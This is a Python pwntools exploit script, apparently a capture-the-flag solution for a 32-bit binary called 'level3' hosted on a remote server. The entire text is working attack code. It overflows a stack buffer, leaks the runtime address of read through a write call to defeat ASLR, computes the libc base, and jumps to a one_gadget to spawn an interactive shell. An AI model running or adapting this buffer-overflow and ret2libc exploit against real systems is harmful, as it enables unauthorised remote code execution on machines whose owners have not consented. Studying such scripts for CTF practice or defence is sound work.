from pwn import*
# from LibcSearcher import*
context.log_level = 'debug'

o = remote("61.147.171.105", 52186)
# o = process("./level3")
elf = ELF("./level3")
# libc = elf.libc
libc = ELF("libc_32.so.6")
write_plt = elf.plt['write']
read_got = elf.got['read']
vuln = elf.sym['vulnerable_function']


# leak addr
payload = b'a'*(0x88+4)
payload += p32(write_plt) + p32(vuln) + p32(1) + p32(read_got) + p32(4)
o.recv()
o.sendline(payload)
read_addr = u32(o.recv(4))
# libc = LibcSearcher("read", read_addr)
libc_base = read_addr - libc.sym["read"]
log.info("libc base: "+hex(libc_base))
one_gadget = libc_base + 0x3a80c
#
# # getshell
payload = b'a'*(0x88 + 4)
payload += p32(one_gadget)
o.sendline(payload)
o.interactive()
